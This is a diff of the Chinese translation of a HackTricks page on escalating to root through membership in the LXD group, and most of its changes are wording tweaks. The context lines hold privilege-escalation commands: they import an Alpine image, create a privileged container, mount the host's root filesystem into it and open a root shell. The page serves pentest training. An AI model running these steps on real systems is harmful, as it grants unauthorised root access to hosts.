@@ -1,13 +1,15 @@
 # lxd/lxc Group - Privilege escalation
 
-加入主机的 LXD 管理组（通常为 _**lxd**）后，可以完全控制 daemon，从而获得一条成为 root 的路径。<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
 
-## 在没有 internet 的情况下进行 Exploiting
+属于主机的 LXD 管理组（通常为 _**lxd**）_，可以通过允许完全控制 daemon 来获得 root 权限路径。<sup>[[1]](#references)</sup>
+
+## 在没有 internet 的情况下利用
 
 ### Method 1
 
-你可以从可信 repository 下载 Alpine image，以便与 LXD 一起使用。
-Canonical 的 LXD image server 每日发布构建版本：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+你可以从可信 repository 下载 Alpine image，以便与 LXD 配合使用。
+Canonical 的 LXD image server 每天发布构建版本：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
 只需从最新构建版本中获取 **lxd.tar.xz** 和 **rootfs.squashfs**（目录名称为日期）。<sup>[[8]](#references)</sup>
 
 或者，你可以按照 [project instructions](https://github.com/lxc/distrobuilder) 在自己的机器上安装 distrobuilder。<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
@@ -33,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-上传 **incus.tar.xz**（如果从 Canonical image server 下载，则为 **lxd.tar.xz**）和 **rootfs.squashfs**，然后导入该 image 并创建 container。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
+上传 **incus.tar.xz**（如果从 Canonical image server 下载，则为 **lxd.tar.xz**）和 **rootfs.squashfs**，然后导入镜像并创建容器。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -50,7 +52,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > 如果遇到此错误 _**Error: No storage pool found. Please create a new storage pool**_\
-> 运行 **`lxd init`**，设置默认 storage pool，然后**重复**上一段命令。<sup>[[2]](#references)</sup>
+> 运行 **`lxd init`**，设置一个默认 storage pool，然后**重复**上一段命令。<sup>[[2]](#references)</sup>
 
 最后，启动 container，并在 host filesystem 上打开 root shell：<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
@@ -60,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### 方法 2
 
-构建一个 Alpine image，并使用标志 `security.privileged=true` 启动它，该标志会将 container root 映射为 host root；随后挂载 `/` 即可将 host filesystem 暴露在 container 内。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
+构建一个 Alpine image，并使用 flag `security.privileged=true` 启动它，该 flag 会将 container root 映射为 host root；随后挂载 `/`，即可将 host filesystem 暴露在 container 内部。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -84,11 +86,11 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 
 - [1] [如何强化 LXD 的安全性](https://canonical.com/lxd/docs/latest/howto/security_harden/)
 - [2] [LXD 容器和虚拟机](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
-- [3] [如何复制和导入镜像](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [3] [如何复制和导入 images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
 - [4] [distrobuilder](https://github.com/lxc/distrobuilder)
-- [5] [如何使用 distrobuilder 构建镜像](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
-- [6] [Alpine 镜像定义](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+- [5] [如何使用 distrobuilder 构建 images](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [6] [Alpine image 定义](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
 - [7] [lxd-alpine-builder 构建脚本](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
-- [8] [LXD 镜像服务器](https://images.lxd.canonical.com/)
+- [8] [LXD image server](https://images.lxd.canonical.com/)
 - [9] [类型：disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
